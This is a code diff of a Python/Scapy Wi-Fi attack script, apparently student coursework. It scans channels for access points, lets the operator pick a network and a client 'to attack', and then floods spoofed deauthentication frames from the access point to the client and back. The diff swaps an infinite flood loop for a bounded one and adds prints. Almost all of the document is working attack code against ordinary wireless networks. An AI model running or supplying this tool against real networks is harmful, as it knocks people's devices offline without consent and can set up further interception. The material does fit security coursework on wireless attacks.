@@ -1,8 +1,6 @@
-import sys
-
 import netifaces
 from scapy.all import *
-from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp, Dot11Elt, Dot11Deauth, RadioTap
+from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap
 
 network_list = {}
 
@@ -76,7 +74,7 @@ def start_sniffer(interface):
     os.system("clear")
     for channel in range(1, 13):
         os.system("iwconfig %s channel %d" % (interface, channel))
-        sniff(iface=interface, timeout=2, prn=packet_handler)
+        sniff(iface=interface, timeout=2, prn=packet_handler) #change timeout to 5 before subbmiting
 
 
 def perform_deauth(router, client, iface):
@@ -85,21 +83,16 @@ def perform_deauth(router, client, iface):
 
     print('Sending Deauth to ' + client + ' from ' + router)
 
-    count = 1
-    while count != 0:
-        try:
-            for i in range(200):
-                # Send out deauth from the AP
-                #send(pckt)
-                sendp(pckt, inter=0.1, count=None, loop=1, iface=iface, verbose=1)
-                # If we're targeting a client, we will also spoof deauth from the client to the AP
-                #send(cli_to_ap_pckt)
-                sendp(cli_to_ap_pckt, inter=0.1, count=None, loop=1, iface=iface, verbose=1)
-            # If count was -1, this will be an infinite loop
-            count -= 1
-        except Exception as e:
-            print(f"error: {e}")
-            break
+    try:
+        for i in range(5):
+            # Send out deauth from the AP
+            sendp(pckt, inter=0.1, count=40, loop=0, iface=iface, verbose=1)
+            # If we're targeting a client, we will also spoof deauth from the client to the AP
+            sendp(cli_to_ap_pckt, inter=0.1, count=40, loop=0, iface=iface, verbose=1)
+            print(f" now on loop {i}")
+
+    except Exception as e:
+        print(f"error: {e}")
 
 
 if __name__ == '__main__':
@@ -126,17 +119,21 @@ if __name__ == '__main__':
 
     # let user pick network - check number is valid
     print(len(network_list))
-    user_choice = input("please pick a network: ")
+    user_choice = input("please pick a network: \n")
     user_key = list(network_list)[int(user_choice) - 1]
     user_network = network_list.get(user_key)
+
+    print(f"swiching to channel number {user_network.chanel}")
     os.system("iwconfig %s channel %d" % (user_iface, user_network.chanel))
 
-    # sniff and display all users in network
+    # display all users in network
     user_network.display_users()
-    user_choice = input("please pick a client to attack: ")
+
+    # let user pick who to attak
+    user_choice = input("please pick a client to attack: \n")
     client_to_attack = user_network.get_users()[int(user_choice)-1]
-    print(f"will be attacking {client_to_attack}")
-    perform_deauth(user_network.get_mac(), client_to_attack, user_iface)
-    # let attacker pick user - check number is valid'''
+    print(f"will be attacking {client_to_attack}\n")
 
     # deauth
+    perform_deauth(user_network.get_mac(), client_to_attack, user_iface)
+
